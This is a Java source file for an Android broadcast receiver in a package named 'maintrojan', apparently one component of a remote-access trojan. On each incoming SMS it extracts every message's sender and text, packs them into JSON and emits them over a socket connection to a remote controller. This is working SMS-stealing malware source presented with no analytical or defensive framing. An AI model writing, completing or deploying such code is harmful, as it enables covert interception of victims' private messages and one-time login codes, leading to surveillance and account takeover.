package com.example.maintrojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import io.socket.client.Socket;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "myTrojan";

    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();
            if (bundle != null){
                Object[] pdus = (Object[]) bundle.get("pdus");
                if(pdus != null){
                    try {
                        JSONArray list = new JSONArray();
                        for (Object pdu : pdus){
                            SmsMessage smsMessage;
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                                String format = bundle.getString("format");
                                smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                            }else{
                                smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            }
                            
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            
                            Log.d(TAG, "SMS Received from: " + sender);
                            
                            JSONObject item = new JSONObject();
                            item.put("address", sender);
                            item.put("body", messageBody);
                            list.put(item);
                        }
                        
                        Socket sock = Connecting.getSock();
                        if (sock != null && sock.connected()) {
                            sock.emit("sms", list);
                        } else {
                            Log.e(TAG, "Socket not connected, cannot send SMS");
                        }
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
